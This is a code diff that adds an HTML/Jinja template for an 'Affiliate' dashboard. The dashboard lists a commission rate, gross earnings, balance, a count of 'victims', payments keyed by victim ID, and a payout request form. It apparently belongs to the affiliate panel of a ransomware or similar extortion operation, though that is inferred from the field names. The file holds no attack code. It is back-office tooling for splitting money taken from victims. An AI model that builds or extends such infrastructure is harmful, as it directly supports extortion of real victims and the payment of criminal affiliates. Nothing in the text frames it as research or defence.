@@ -1,0 +1,48 @@
+{% extends "base.html" %}
+{% block title %}affiliate{% endblock %}
+{% block content %}
+<h1>Affiliate — {{ summary['username'] }}</h1>
+<div class="panel">
+  <table>
+    <tr><th>commission</th><th>gross</th><th>paid</th><th>requested</th><th>balance</th><th>victims</th></tr>
+    <tr>
+      <td>{{ summary['pct'] }}%</td>
+      <td>${{ '%.2f'|format(summary['total']) }}</td>
+      <td>${{ '%.2f'|format(summary['paid']) }}</td>
+      <td>${{ '%.2f'|format(summary['requested']) }}</td>
+      <td>${{ '%.2f'|format(summary['balance']) }}</td>
+      <td>{{ summary['victims'] }}</td>
+    </tr>
+  </table>
+</div>
+<div class="panel">
+  <h2>Request payout</h2>
+  <form method="post" action="{{ url_for('affiliate_request') }}">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <input name="amount" placeholder="amount USD">
+    <input name="note" placeholder="note">
+    <button class="btn blue" type="submit">REQUEST</button>
+  </form>
+</div>
+<div class="panel">
+  <h2>Payments</h2>
+  <table>
+    <tr><th>victim</th><th>amount</th><th>note</th><th>ts</th></tr>
+    {% for p in payments %}
+    <tr><td>{{ p['vid'][:12] }}</td><td>${{ '%.2f'|format(p['amount']) }}</td>
+    <td>{{ p['note'] }}</td><td class="small">{{ p['ts'] }}</td></tr>
+    {% else %}<tr><td colspan="4" class="sub">none</td></tr>{% endfor %}
+  </table>
+</div>
+<div class="panel">
+  <h2>Payouts</h2>
+  <table>
+    <tr><th>id</th><th>amount</th><th>status</th><th>note</th><th>updated</th></tr>
+    {% for p in payouts %}
+    <tr><td>{{ p['id'] }}</td><td>${{ '%.2f'|format(p['amount']) }}</td>
+    <td>{{ p['status'] or 'paid' }}</td><td>{{ p['note'] }}</td>
+    <td class="small">{{ p['updated'] or p['ts'] }}</td></tr>
+    {% else %}<tr><td colspan="5" class="sub">none</td></tr>{% endfor %}
+  </table>
+</div>
+{% endblock %}
